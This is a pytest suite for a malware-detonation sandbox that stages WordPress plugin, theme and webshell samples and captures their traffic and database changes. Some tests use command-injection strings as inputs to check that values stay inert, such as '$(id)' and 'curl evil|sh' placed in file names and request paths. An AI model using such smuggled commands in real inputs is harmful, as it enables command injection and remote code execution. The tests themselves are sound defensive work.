import os
from kadath import run

def test_type_from_staged():
    assert run._type_from_staged("/x/samples/plugins/evil", "/x") == "plugin"
    assert run._type_from_staged("/x/samples/themes/th", "/x") == "theme"
    assert run._type_from_staged("/x/samples/webroot/c99.php", "/x") == "webshell"

def test_hash_sample_file(tmp_path):
    p = tmp_path / "a.php"; p.write_bytes(b"<?php echo 1;")
    s, m = run._hash_sample(str(p))
    assert len(s) == 64 and len(m) == 32
    assert all(c in "0123456789abcdef" for c in s)

def test_hash_sample_dir(tmp_path):
    d = tmp_path / "plug"; d.mkdir(); (d / "main.php").write_bytes(b"<?php")
    s, m = run._hash_sample(str(d))
    assert len(s) == 64 and len(m) == 32

def test_apply_slug_plugin_updates_dest():
    from kadath import detect
    d = detect.Detected("plugin", "old", "samples/plugins/old")
    n = run._apply_slug(d, "new")
    assert n.slug == "new" and n.dest == "samples/plugins/new"

def test_apply_slug_webshell_keeps_dest():
    from kadath import detect
    d = detect.Detected("webshell", "old", "samples/webroot/shell.php")
    n = run._apply_slug(d, "new")
    assert n.dest == "samples/webroot/shell.php"


def test_activate_direct_edits_active_plugins():
    from kadath import run
    calls = []

    def wp(args):
        calls.append(args)
        if args[1:3] == ["option", "get"]:
            return '["akismet/akismet.php"]'
        return ""
    out = run._activate_direct("FIO-1/kadath-wrapper.php", wp=wp)
    assert out == ["akismet/akismet.php", "FIO-1/kadath-wrapper.php"]
    assert calls[1][:4] == ["--skip-plugins", "option", "update", "active_plugins"]
    assert '"FIO-1/kadath-wrapper.php"' in calls[1][4] and calls[1][5] == "--format=json"
    assert not any(a[1:3] == ["plugin", "activate"] for a in calls)
    # already active: no update
    calls.clear()
    run._activate_direct("akismet/akismet.php", wp=wp)
    assert len(calls) == 1


import gzip
import struct
import time


def test_admin_credentials(tmp_path, monkeypatch):
    monkeypatch.setattr(run, "ROOT", str(tmp_path))
    monkeypatch.delenv("WP_ADMIN_USER", raising=False)
    monkeypatch.delenv("WP_ADMIN_PASSWORD", raising=False)
    assert run._admin_credentials() == ("admin", "sandbox")          # no .env, no env
    (tmp_path / ".env").write_text(
        "# comment\n\nOTHER=1\nWP_ADMIN_USER=boss\nWP_ADMIN_PASSWORD=\"p@ss=word\"\n")
    assert run._admin_credentials() == ("boss", "p@ss=word")
    monkeypatch.setenv("WP_ADMIN_USER", "envuser")                    # env wins, per key
    assert run._admin_credentials() == ("envuser", "p@ss=word")
    (tmp_path / ".env").write_text("WP_ADMIN_PASSWORD='single'\n")
    monkeypatch.delenv("WP_ADMIN_USER")
    assert run._admin_credentials() == ("admin", "single")


def _tree(tmp_path):
    src = tmp_path / "artifacts"
    for d in ("dns", "mitm", "pcap", "php"):
        (src / d).mkdir(parents=True)
    return src


def _gz(path):
    with gzip.open(path, "rb") as f:
        return f.read()


def test_bundle_slices_log_from_offset(tmp_path):
    src = _tree(tmp_path)
    (src / "dns" / "dns.log").write_bytes(b"history\nthis run\n")
    dest = tmp_path / "out"
    written, warnings = run._bundle_artifacts(
        str(src), str(dest), int(time.time()) - 5, {"dns/dns.log": len(b"history\n")})
    assert "dns/dns.log.gz" in written and warnings == []
    assert _gz(dest / "dns" / "dns.log.gz") == b"this run\n"


def test_bundle_skips_log_with_nothing_appended(tmp_path):
    src = _tree(tmp_path)
    (src / "dns" / "dns.log").write_bytes(b"history\n")
    written, _ = run._bundle_artifacts(
        str(src), str(tmp_path / "out"), int(time.time()) - 5, {"dns/dns.log": 8})
    assert written == []


def test_bundle_offset_beyond_size_copies_whole_with_warning(tmp_path):
    src = _tree(tmp_path)
    (src / "dns" / "dns.log").write_bytes(b"rotated\n")
    dest = tmp_path / "out"
    _, warnings = run._bundle_artifacts(
        str(src), str(dest), int(time.time()) - 5, {"dns/dns.log": 999})
    assert warnings and "dns/dns.log" in warnings[0]
    assert _gz(dest / "dns" / "dns.log.gz") == b"rotated\n"


def test_bundle_flows_tail_at_record_boundary_is_sliced(tmp_path):
    src = _tree(tmp_path)
    old, new = b"3:abc}", b"12:" + b"x" * 12
    (src / "mitm" / "flows.mitm").write_bytes(old + new)
    dest = tmp_path / "out"
    written, warnings = run._bundle_artifacts(
        str(src), str(dest), int(time.time()) - 5, {"mitm/flows.mitm": len(old)})
    assert warnings == []
    assert _gz(dest / "mitm" / "flows.mitm.gz") == new


def test_bundle_flows_tail_mid_record_copies_whole_with_warning(tmp_path):
    src = _tree(tmp_path)
    data = b"20:" + b"y" * 20 + b"}" + b"4:zzzz}"
    (src / "mitm" / "flows.mitm").write_bytes(data)
    dest = tmp_path / "out"
    _, warnings = run._bundle_artifacts(
        str(src), str(dest), int(time.time()) - 5, {"mitm/flows.mitm": 7})   # inside the y's
    assert len(warnings) == 1 and "record boundary" in warnings[0]
    assert _gz(dest / "mitm" / "flows.mitm.gz") == data


def test_bundle_pcap_is_sliced_by_epoch(tmp_path):
    src = _tree(tmp_path)

    def pcap(pkts):
        out = struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)
        for ts, d in pkts:
            out += struct.pack("<IIII", ts, 0, len(d), len(d)) + d
        return out
    epoch = int(time.time()) - 5
    (src / "pcap" / "sandbox-1.pcap00").write_bytes(pcap([(epoch - 100, b"old"), (epoch + 1, b"new")]))
    dest = tmp_path / "out"
    written, warnings = run._bundle_artifacts(str(src), str(dest), epoch)
    assert "pcap/sandbox-1.pcap00" in written and warnings == []
    assert (dest / "pcap" / "sandbox-1.pcap00").read_bytes() == pcap([(epoch + 1, b"new")])


def test_bundle_pcap_unknown_magic_warns(tmp_path):
    src = _tree(tmp_path)
    (src / "pcap" / "x.pcap00").write_bytes(b"NOTAPCAP" * 8)
    _, warnings = run._bundle_artifacts(str(src), str(tmp_path / "out"), int(time.time()) - 5)
    assert len(warnings) == 1 and "magic" in warnings[0]


def test_dbstate_or_warn_survives_a_dead_container(monkeypatch):
    from kadath.shell import ShellError
    before = object()
    warnings = []

    def dead():
        raise ShellError(["docker"], 1, "container is not running")
    monkeypatch.setattr(run, "_dbstate", dead)
    assert run._dbstate_or_warn(before, warnings) is before
    assert len(warnings) == 1 and "unreachable" in warnings[0] and "DB diff unavailable" in warnings[0]
    monkeypatch.setattr(run, "_dbstate", lambda: "after")
    assert run._dbstate_or_warn(before, warnings) == "after" and len(warnings) == 1


def test_dbstate_failure_via_wp(monkeypatch):
    """Same path one level down: _wp raising inside the real _dbstate."""
    from kadath.shell import ShellError

    def wp(args):
        raise ShellError(["docker"], 137, "")
    monkeypatch.setattr(run, "_wp", wp)
    warnings = []
    assert run._dbstate_or_warn("before", warnings) == "before" and warnings


def test_offer_reset_records_db_baseline_after_make_up(tmp_path, monkeypatch):
    """--reset: make reset, make up, then the pristine DB becomes the baseline
    every later isolate() resets to. Stops the offering right after by raising."""
    from kadath import stage

    class StopHere(Exception):
        pass
    sample = tmp_path / "probe.php"
    sample.write_text("<?php echo 1;")
    monkeypatch.setattr(run, "ROOT", str(tmp_path))
    monkeypatch.setattr(run, "_healthy", lambda: True)
    monkeypatch.setattr(run, "_selftest_ok", lambda: True)
    seen = []

    class R:
        stdout = ""
    monkeypatch.setattr(run, "sh", lambda argv, **kw: seen.append(argv) or R())
    recorded = []

    def record(root, wp):
        recorded.append(root)
        wp(["option", "list"])
        raise StopHere
    monkeypatch.setattr(stage, "record_db_baseline", record)
    monkeypatch.setattr(stage, "isolate", lambda root, wp: (_ for _ in ()).throw(AssertionError("isolate ran")))
    try:
        run.offer([str(sample), "--reset"])
        assert False, "expected StopHere"
    except StopHere:
        pass
    assert recorded == [str(tmp_path)]
    assert seen[:2] == [["make", "reset"], ["make", "up"]]
    # the baseline's wp calls go through the container, with the wrapper flag
    assert seen[2][:5] == ["docker", "compose", "exec", "-T", "wordpress"]
    assert seen[2][5:9] == ["wp", "--skip-plugins", "option", "list"]


def test_wp_started_at(monkeypatch):
    from kadath.shell import ShellError
    calls = []

    class R:
        def __init__(self, out):
            self.stdout = out

    def ok(argv, **kw):
        calls.append(argv)
        return R("abc123\n" if argv[:3] == ["docker", "compose", "ps"] else "2026-11-08T01:02:03Z\n")
    monkeypatch.setattr(run, "sh", ok)
    assert run._wp_started_at() == "2026-11-08T01:02:03Z"
    assert calls[0] == ["docker", "compose", "ps", "-q", "wordpress"]
    assert calls[1] == ["docker", "inspect", "-f", "{{.State.StartedAt}}", "abc123"]

    monkeypatch.setattr(run, "sh", lambda argv, **kw: R("\n"))     # no container id
    assert run._wp_started_at() == ""

    def boom(argv, **kw):
        raise ShellError(argv, 1, "no such container")
    monkeypatch.setattr(run, "sh", boom)
    assert run._wp_started_at() == ""


# --- run.env ---

def test_run_env_quotes_every_value_and_round_trips(tmp_path):
    import shlex
    path = tmp_path / "run.env"
    evil = "/tmp/x;$(id)\n`curl evil|sh`;.php\x00\x1b[31m"
    run._write_run_env(str(path), [("RUN_EPOCH", 1700000000), ("SAMPLE_SRC", evil), ("SLUG", "a b")])
    text = path.read_text()
    toks = shlex.split(text)
    assert toks == ["RUN_EPOCH=1700000000", "SAMPLE_SRC=/tmp/x;$(id)`curl evil|sh`;.php[31m", "SLUG=a b"]
    assert text.count("\n") == 3                     # no raw newline inside a value
    assert "\x00" not in text and "\x1b" not in text
    # sourced by a real shell: nothing executes, values come back intact
    import subprocess
    r = subprocess.run(["sh", "-c", f'set -a; . "{path}"; set +a; printf %s "$SAMPLE_SRC"'],
                       capture_output=True, text=True, cwd=str(tmp_path))
    assert r.stdout == "/tmp/x;$(id)`curl evil|sh`;.php[31m" and r.returncode == 0


def test_run_env_survives_a_non_utf8_filename(tmp_path):
    path = tmp_path / "run.env"
    name = os.fsdecode(b"/tmp/\xff\xfe.php")
    run._write_run_env(str(path), [("SAMPLE_SRC", name)])
    assert path.read_bytes() == b"SAMPLE_SRC='/tmp/\xff\xfe.php'\n"


# --- hashing a directory sample ---

def test_hash_sample_dir_does_not_follow_links_or_open_fifos(tmp_path):
    d = tmp_path / "plug"; d.mkdir()
    (d / "main.php").write_bytes(b"<?php")
    secret = tmp_path / "secret"; secret.write_text("one")
    (d / "loot").symlink_to(secret)
    os.mkfifo(d / "pipe")
    (d / "dirlink").symlink_to(tmp_path)
    s1, _ = run._hash_sample(str(d))            # must not hang on the FIFO
    secret.write_text("two")                    # a link target's content is not part of the hash
    assert run._hash_sample(str(d))[0] == s1
    (d / "loot").unlink(); (d / "loot").symlink_to(tmp_path / "other")
    assert run._hash_sample(str(d))[0] != s1    # but where it points is


# --- flow extraction ---

class _R:
    def __init__(self, out=""):
        self.stdout = out


def _flowdump_out(*flows):
    import json
    return "\n".join(json.dumps(f) for f in flows) + "\n"


def test_flows_tail_is_copied_into_the_gateway_and_verified(tmp_path, monkeypatch):
    monkeypatch.setattr(run, "ROOT", str(tmp_path))
    (tmp_path / "artifacts" / "mitm").mkdir(parents=True)
    old, new = b"3:abc}", b"12:" + b"x" * 12
    (tmp_path / "artifacts" / "mitm" / "flows.mitm").write_bytes(old + new)
    calls, copied = [], {}

    def fake(argv, **kw):
        calls.append((argv, kw))
        if argv[:4] == ["docker", "compose", "cp", argv[3]] and argv[4] == "gateway:/tmp/flows-run.mitm":
            copied["data"] = open(argv[3], "rb").read()
            copied["path"] = argv[3]
        if "mitmdump" in argv:
            return _R(_flowdump_out(
                {"host": "api.wordpress.org", "method": "GET", "path": "/", "status": 200,
                 "wp_core": True, "dst": "6.6.6.6", "sni": None},
                {"host": "api.wordpress.org", "method": "GET", "path": "/", "status": 200,
                 "wp_core": True, "dst": "66.6.42.251", "sni": "api.wordpress.org"}))
        return _R()
    monkeypatch.setattr(run, "sh", fake)
    flows, warns = run._flows(1000, len(old), {"api.wordpress.org": {"66.6.42.251"}})
    assert warns == []
    assert [(f["wp_core"], f["host_spoofed"]) for f in flows] == [(False, True), (True, False)]
    assert copied["data"] == new                          # only the bytes appended during the run
    assert not os.path.exists(copied["path"])             # temp file cleaned up
    dump = [c for c in calls if "mitmdump" in c[0]][0]
    assert dump[0][dump[0].index("-r") + 1] == "/tmp/flows-run.mitm"
    assert "RUN_EPOCH=1000" in dump[0] and dump[1]["timeout"] == 300


def test_flows_whole_file_when_offset_is_mid_record(tmp_path, monkeypatch):
    monkeypatch.setattr(run, "ROOT", str(tmp_path))
    (tmp_path / "artifacts" / "mitm").mkdir(parents=True)
    (tmp_path / "artifacts" / "mitm" / "flows.mitm").write_bytes(b"20:" + b"y" * 20 + b"}4:zzzz}")
    calls = []

    def fake(argv, **kw):
        calls.append(argv)
        return _R("")
    monkeypatch.setattr(run, "sh", fake)
    flows, warns = run._flows(1000, 7, {})
    assert flows == [] and warns == []
    assert not any(c[:3] == ["docker", "compose", "cp"] and "flows-run" in c[-1] for c in calls)
    dump = [c for c in calls if "mitmdump" in c][0]
    assert dump[dump.index("-r") + 1] == "/artifacts/mitm/flows.mitm"


def test_flows_failures_become_warnings(tmp_path, monkeypatch):
    from kadath.shell import ShellError
    monkeypatch.setattr(run, "ROOT", str(tmp_path))
    (tmp_path / "artifacts" / "mitm").mkdir(parents=True)
    (tmp_path / "artifacts" / "mitm" / "flows.mitm").write_bytes(b"")

    def timeout(argv, **kw):
        if "mitmdump" in argv:
            raise ShellError(argv, 124, "timed out after 300s")
        return _R()
    monkeypatch.setattr(run, "sh", timeout)
    flows, warns = run._flows(1, 0, {})
    assert flows == [] and warns == ["flow extraction failed (timeout); network summary incomplete"]

    def crash(argv, **kw):
        if "mitmdump" in argv:
            raise ShellError(argv, 1, "Traceback: boom")
        return _R()
    monkeypatch.setattr(run, "sh", crash)
    _, warns = run._flows(1, 0, {})
    assert len(warns) == 1 and warns[0].startswith("flow extraction failed (exit 1: Traceback: boom)")
    assert warns[0].endswith("network summary incomplete")

    monkeypatch.setattr(run, "sh", lambda argv, **kw: _R('{"host":"a.example","method":"GET","path":"/"}\n{"host\n'))
    flows, warns = run._flows(1, 0, {})
    assert [f["host"] for f in flows] == ["a.example"]          # one bad line costs only that line
    assert warns == ["flow extraction failed (1 unparseable line(s)); network summary incomplete"]


# --- cleanup order and docroot taint ---

def _trace_calls(monkeypatch, tainted_before, restore_exc=None):
    from kadath import stage
    order = []
    monkeypatch.setattr(stage, "docroot_tainted", lambda sh_exec, sha="": (order.append(("taint", sha)), tainted_before)[1])

    def restore(sh_exec):
        order.append("restore")
        if restore_exc:
            raise restore_exc
    monkeypatch.setattr(stage, "restore_docroot", restore)
    monkeypatch.setattr(stage, "isolate", lambda root, wp, warnings=None: order.append("isolate") or [])
    monkeypatch.setattr(run, "_recreate_wordpress", lambda: order.append("recreate"))
    return order


def test_clean_slate_isolates_then_restores_when_the_docroot_is_clean(tmp_path, monkeypatch):
    monkeypatch.setattr(run, "ROOT", str(tmp_path))
    (tmp_path / ".kadath").mkdir()
    (tmp_path / ".kadath" / "wp-config.sha256").write_text("ab" * 32 + "\n")
    order = _trace_calls(monkeypatch, [])
    warnings = []
    assert run._clean_slate(lambda a: "", warnings) == 0
    assert order == [("taint", "ab" * 32), "isolate", "restore"] and warnings == []


def test_clean_slate_restores_and_recreates_before_isolate_when_tainted(tmp_path, monkeypatch):
    monkeypatch.setattr(run, "ROOT", str(tmp_path))
    order = _trace_calls(monkeypatch, ["wp-content/mu-plugins/x.php", "wp-config.php changed"])
    warnings = []
    assert run._clean_slate(lambda a: "", warnings) == 0
    assert order == [("taint", ""), "restore", "recreate", "isolate"]      # no recorded sha: ""
    assert len(warnings) == 1 and "wp-content/mu-plugins/x.php" in warnings[0] and "before cleanup" in warnings[0]


def test_clean_slate_treats_a_failed_taint_check_as_tainted(tmp_path, monkeypatch):
    from kadath import stage
    from kadath.shell import ShellError
    monkeypatch.setattr(run, "ROOT", str(tmp_path))
    order = _trace_calls(monkeypatch, [])

    def boom(sh_exec, sha=""):
        raise ShellError(["docker"], 1, "container is not running")
    monkeypatch.setattr(stage, "docroot_tainted", boom)
    warnings = []
    assert run._clean_slate(lambda a: "", warnings) == 0
    assert order == ["restore", "recreate", "isolate"] and "taint check failed" in warnings[0]


def test_clean_slate_restore_failure_is_fatal(tmp_path, monkeypatch, capsys):
    from kadath.shell import ShellError
    monkeypatch.setattr(run, "ROOT", str(tmp_path))
    err = ShellError(["docker"], 1, "rm: cannot remove 'x': Operation not permitted")
    order = _trace_calls(monkeypatch, [], restore_exc=err)
    assert run._clean_slate(lambda a: "", []) == 3
    assert order[-1] == "restore"
    assert "error: docroot restore failed: rm: cannot remove" in capsys.readouterr().err
    order = _trace_calls(monkeypatch, ["wp-content/db.php"], restore_exc=err)
    assert run._clean_slate(lambda a: "", []) == 3 and "isolate" not in order


def test_taint_after_warns_and_returns_indicators(monkeypatch):
    from kadath import stage
    from kadath.shell import ShellError
    seen = []
    monkeypatch.setattr(stage, "docroot_tainted", lambda sh_exec, sha="": seen.append(sha) or ["wp-content/db.php"])
    warnings = []
    assert run._taint_after("f" * 64, warnings) == ["wp-content/db.php"]
    assert seen == ["f" * 64]
    assert warnings == ["docroot tainted during the run (wp-content/db.php); DB state read through wp is untrusted"]
    monkeypatch.setattr(stage, "docroot_tainted", lambda sh_exec, sha="": [])
    w2 = []
    assert run._taint_after("", w2) == [] and w2 == []

    def dead(sh_exec, sha=""):
        raise ShellError(["docker"], 137, "")
    monkeypatch.setattr(stage, "docroot_tainted", dead)
    w3 = []
    assert run._taint_after("", w3) == [] and len(w3) == 1 and "unverified" in w3[0]


def test_record_wp_config_sha_round_trip_and_failure(tmp_path, monkeypatch):
    from kadath import stage
    from kadath.shell import ShellError
    monkeypatch.setattr(run, "ROOT", str(tmp_path))
    monkeypatch.setattr(stage, "wp_config_sha", lambda sh_exec: "c" * 64)
    w = []
    assert run._record_wp_config_sha(w) == "c" * 64 and run._read_wp_config_sha() == "c" * 64 and w == []

    def dead(sh_exec):
        raise ShellError(["docker"], 1, "")
    monkeypatch.setattr(stage, "wp_config_sha", dead)
    assert run._record_wp_config_sha(w) == "" and run._read_wp_config_sha() == "" and len(w) == 1
    monkeypatch.setattr(stage, "wp_config_sha", lambda sh_exec: "")
    w = []
    assert run._record_wp_config_sha(w) == "" and len(w) == 1


def test_wp_sh_runs_bash_in_the_wordpress_container(monkeypatch):
    seen = []

    class R:
        stdout = "out"
    monkeypatch.setattr(run, "sh", lambda argv, **kw: seen.append(argv) or R())
    assert run._wp_sh("echo hi") == "out"
    assert seen == [["docker", "compose", "exec", "-T", "wordpress", "bash", "-c", "echo hi"]]


def test_shell_error_tail_helper():
    from kadath.shell import ShellError
    assert run._tail(ShellError(["x"], 3, "  a\nb  \n")) == "a\nb"
    assert run._tail(ShellError(["x"], 3, "")) == "exit 3"
    assert len(run._tail(ShellError(["x"], 1, "z" * 1000))) == 300


# --- offer(), end to end with the container layer stubbed ---

def _stub_offer(tmp_path, monkeypatch, tainted_after=(), activate_fails=False, restore_fails=False):
    """Everything below offer()'s own logic is faked; returns the call log."""
    from kadath import stage, trigger, recipe, dbdiff
    from kadath.shell import ShellError
    (tmp_path / "artifacts" / "xdebug").mkdir(parents=True)
    (tmp_path / "artifacts" / "dns").mkdir()
    (tmp_path / "artifacts" / "dns" / "dns.log").write_text("")
    monkeypatch.setattr(run, "ROOT", str(tmp_path))
    monkeypatch.setattr(run, "_healthy", lambda: True)
    monkeypatch.setattr(run, "_selftest_ok", lambda: True)
    monkeypatch.setattr(run, "_wp_started_at", lambda: "t0")
    monkeypatch.setattr(run, "_dbstate", lambda: dbdiff.state_from_json("[]", "[]", "[]"))
    monkeypatch.setattr(run.time, "sleep", lambda s: None)
    monkeypatch.setattr(run, "_flows", lambda epoch, off=0, dm=None: ([], []))
    log = []

    def fake_sh(argv, **kw):
        log.append(argv)
        return _R("")
    monkeypatch.setattr(run, "sh", fake_sh)

    def fake_wp(args):
        log.append(["wp"] + args)
        if activate_fails and args[1:3] == ["plugin", "activate"]:
            raise ShellError(["wp"], 1, "PHP Fatal error: Uncaught Error in sample.php")
        return ""
    monkeypatch.setattr(run, "_wp", fake_wp)
    state = {"phase": "before"}

    def taint(sh_exec, sha=""):
        log.append(("taint", sha, state["phase"]))
        state["phase"] = "after"
        return list(tainted_after) if state["phase"] == "after" and len([l for l in log if isinstance(l, tuple)]) > 1 else []
    monkeypatch.setattr(stage, "docroot_tainted", taint)
    monkeypatch.setattr(stage, "wp_config_sha", lambda sh_exec: "d" * 64)

    def restore(sh_exec):
        log.append("restore")
        if restore_fails:
            raise ShellError(["docker"], 1, "chmod: Operation not permitted")
    monkeypatch.setattr(stage, "restore_docroot", restore)
    monkeypatch.setattr(stage, "isolate", lambda root, wp, warnings=None: log.append("isolate") or [])

    class Sess:
        actions = ["LOGIN admin -> 200 ok", "GET /x;curl evil|sh;.php -> 200"]
        logged_in = True
    monkeypatch.setattr(run, "WpSession", lambda url: Sess())
    monkeypatch.setattr(trigger, "execute", lambda session, actions: None)
    monkeypatch.setattr(trigger, "default_actions", lambda det, login: [])
    return log


def test_offer_writes_a_safe_run_env_and_records_taint(tmp_path, monkeypatch):
    import json, shlex
    log = _stub_offer(tmp_path, monkeypatch, tainted_after=["wp-content/mu-plugins/x.php"])
    sample = tmp_path / "sam;$(id)\nple.php"
    sample.write_text("<?php echo 1;")
    assert run.offer([str(sample), "--json"]) == 0
    rd = next((tmp_path / "reports").iterdir())
    env = shlex.split((rd / "run.env").read_text())
    assert [t.split("=")[0] for t in env] == ["RUN_EPOCH", "RUN_UTC", "SLUG", "SAMPLE_SRC",
                                             "SAMPLE_SHA256", "SAMPLE_MD5", "SAMPLE_TYPE"]
    assert dict(t.split("=", 1) for t in env)["SAMPLE_SRC"] == str(sample).replace("\n", "")
    assert "TRIGGER_ACTIONS" not in (rd / "run.env").read_text()
    s = json.load(open(rd / "summary.json"))
    assert s["run"]["trigger_actions"][1].startswith("GET /x;curl")
    assert s["run"]["docroot_tainted"] == ["wp-content/mu-plugins/x.php"]
    assert any(w.startswith("docroot tainted during the run (wp-content/mu-plugins/x.php)") for w in s["warnings"])
    # the sha recorded after the post-staging recreate is the one compared after the run
    assert (tmp_path / ".kadath" / "wp-config.sha256").read_text().strip() == "d" * 64
    assert [l for l in log if isinstance(l, tuple)] == [("taint", "", "before"), ("taint", "d" * 64, "after")]
    assert log.index("isolate") < log.index("restore")


def test_offer_clean_run_has_empty_docroot_tainted(tmp_path, monkeypatch):
    import json
    _stub_offer(tmp_path, monkeypatch)
    sample = tmp_path / "ok.php"; sample.write_text("<?php echo 1;")
    assert run.offer([str(sample), "--json"]) == 0
    s = json.load(open(next((tmp_path / "reports").iterdir()) / "summary.json"))
    assert s["run"]["docroot_tainted"] == [] and not any("tainted" in w for w in s["warnings"])


def test_offer_activation_failure_is_a_warning_not_a_crash(tmp_path, monkeypatch):
    import json
    _stub_offer(tmp_path, monkeypatch, activate_fails=True)
    sample = tmp_path / "p.php"; sample.write_text("<?php\n/* Plugin Name: P */\n")
    assert run.offer([str(sample), "--json"]) == 0
    s = json.load(open(next((tmp_path / "reports").iterdir()) / "summary.json"))
    assert any(w.startswith("activation failed: PHP Fatal error") for w in s["warnings"])


def test_offer_restore_failure_is_fatal_exit_3(tmp_path, monkeypatch, capsys):
    log = _stub_offer(tmp_path, monkeypatch, restore_fails=True)
    sample = tmp_path / "ok.php"; sample.write_text("<?php echo 1;")
    assert run.offer([str(sample)]) == 3
    assert "error: docroot restore failed: chmod: Operation not permitted" in capsys.readouterr().err
    assert not (tmp_path / "reports").exists() or not list((tmp_path / "reports").iterdir())


def test_offer_refuses_a_loose_core_name_before_touching_anything(tmp_path, monkeypatch, capsys):
    log = _stub_offer(tmp_path, monkeypatch)
    d = tmp_path / "in"; d.mkdir()
    sample = d / "wp-login.php"; sample.write_text("<?php echo 1;")
    assert run.offer([str(sample)]) == 2
    assert "wp-login.php" in capsys.readouterr().err and log == []


def test_offer_takes_the_lock_before_the_preflight(tmp_path, monkeypatch, capsys):
    import fcntl
    _stub_offer(tmp_path, monkeypatch)
    monkeypatch.setattr(run, "_healthy", lambda: (_ for _ in ()).throw(AssertionError("preflight ran")))
    (tmp_path / ".kadath").mkdir()
    held = open(tmp_path / ".kadath" / "offer.lock", "w")
    fcntl.flock(held, fcntl.LOCK_EX)
    sample = tmp_path / "ok.php"; sample.write_text("<?php echo 1;")
    try:
        assert run.offer([str(sample)]) == 2
    finally:
        held.close()
    assert "another offering is in progress" in capsys.readouterr().err


def test_offer_uses_recipe_discover_never_a_symlinked_recipe(tmp_path, monkeypatch):
    import json
    from kadath import trigger, recipe
    _stub_offer(tmp_path, monkeypatch)
    sample = tmp_path / "ok.php"; sample.write_text("<?php echo 1;")
    secret = tmp_path / "other.kadath"; secret.write_text("GET /from-symlink\n")
    (tmp_path / "ok.php.kadath").symlink_to(secret)
    ran = []
    monkeypatch.setattr(trigger, "execute", lambda session, actions: ran.append(actions))
    called = []
    real = recipe.discover
    monkeypatch.setattr(recipe, "discover", lambda p: called.append(p) or real(p))
    assert run.offer([str(sample), "--json"]) == 0
    assert called == [str(sample)]
    assert ran == [[]]                          # the default (stubbed to empty): the link was not read
    os.unlink(tmp_path / "ok.php.kadath")
    (tmp_path / "ok.php.kadath").write_text("GET /real\n")
    ran.clear()
    assert run.offer([str(sample), "--json"]) == 0
    assert [a.kind for a in ran[0]] == ["get"]
